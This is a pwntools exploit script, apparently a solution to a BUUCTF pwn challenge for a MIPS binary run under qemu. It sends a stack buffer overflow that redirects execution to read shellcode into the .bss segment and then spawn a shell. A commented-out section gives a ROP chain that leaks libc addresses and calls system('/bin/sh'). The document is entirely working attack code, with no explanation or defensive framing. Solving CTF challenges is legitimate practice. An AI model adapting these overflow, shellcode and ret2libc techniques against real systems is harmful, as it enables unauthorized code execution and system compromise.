#encoding:utf-8
from pwn import *
import sys
context.binary = "pwn2"
context.log_level = "debug"

if sys.argv[1] == "r":
    p = remote("node3.buuoj.cn", 28110)
elif sys.argv[1] == "l":
    p = process(["qemu-mipsel", "-L", "/usr/mipsel-linux-uclibc", "pwn2"])
else:
    p = process(["qemu-mipsel", "-g", "1234", "-L", "/usr/mipsel-linux-uclibc", "pwn2"])

elf = ELF("pwn2")
libc = ELF("/usr/mipsel-linux-uclibc/lib/libc.so.0")

padding = 36
bss = 0x410B70
text_read = 0x4007E0

p.recvuntil("What's your name:")
p.sendline("skye")
p.recv()

log.info("bss:"+hex(elf.bss()))

shellcode = asm(shellcraft.sh())
#ret2shellcode
payload = 'a'*(padding-4)
#fp
payload += p32(bss + 0x200 - 0x18)
#调用read向bss段输入shellcode，然后ret到bss段
payload += p32(text_read)
 
p.send(payload)
 
sleep(0.1)
payload = 'a'*0x24     #12
payload += p32(bss + 0x200 + 0x28)
payload += shellcode
p.send(payload)
'''
sleep(0.2)

# gadget1
payload = 'a'*padding
payload += p32(0x004006C8)

#payload += p32(elf.plt['puts'])	# fp
payload += p32(1)

payload += "a" * 0x18
payload += 'a' * 4 # s0
#payload += p32(elf.got['puts']) # s1
payload += p32(0x00410B58)
payload += p32(0x0040092C) # s2


payload += 'a' * 4 # s3
payload += p32(0x004007A4) # ra


payload += 'a'*0x20
payload += p32(0x004007C4)

sleep(0.2)
p.send(payload)

p.recv()
#success(a)
libc_addr = u32(p.recv(4))-libc.symbols['puts']

success("libc_addr: " + hex(libc_addr))

p.recv()
#p.send(payload)
system_addr = libc_addr + libc.symbols['system']
binsh_addr = libc_addr + 0x9bc48



# gadget2
payload = 'a'*0x24
payload += p32(0x004006C8)

payload += 'a'*0x1c
payload += 'a'*4 #s0
payload += p32(binsh_addr)
payload += p32(system_addr)
payload += 'a'*4
payload += p32(0x004007A4)

p.send(payload)
'''

p.interactive()